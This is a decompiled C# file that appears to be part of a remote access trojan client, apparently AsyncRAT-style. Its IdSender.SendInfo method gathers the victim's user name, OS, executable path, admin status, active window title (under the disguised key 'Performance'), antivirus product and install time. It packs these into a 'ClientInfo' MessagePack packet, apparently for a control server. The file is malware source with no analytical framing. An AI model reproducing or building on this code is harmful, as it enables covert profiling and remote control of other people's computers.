using System;
using System.IO;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Microsoft.VisualBasic.Devices;

namespace Client.Helper;

public static class IdSender
{
	public static byte[] SendInfo()
	{
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Packet").AsString = "ClientInfo";
		msgPack.ForcePathObject("HWID").AsString = Settings.Hwid;
		msgPack.ForcePathObject("User").AsString = Environment.UserName.ToString();
		msgPack.ForcePathObject("OS").AsString = new ComputerInfo().get_OSFullName().ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
		msgPack.ForcePathObject("Path").AsString = Application.get_ExecutablePath();
		msgPack.ForcePathObject("Version").AsString = Settings.Version;
		msgPack.ForcePathObject("Admin").AsString = Methods.IsAdmin().ToString().ToLower()
			.Replace("true", "Admin")
			.Replace("false", "User");
		msgPack.ForcePathObject("Performance").AsString = Methods.GetActiveWindowTitle();
		msgPack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
		msgPack.ForcePathObject("Antivirus").AsString = Methods.Antivirus();
		msgPack.ForcePathObject("Installed").AsString = new FileInfo(Application.get_ExecutablePath()).LastWriteTime.ToUniversalTime().ToString();
		msgPack.ForcePathObject("Pong").AsString = "";
		msgPack.ForcePathObject("Group").AsString = Settings.Group;
		return msgPack.Encode2Bytes();
	}
}
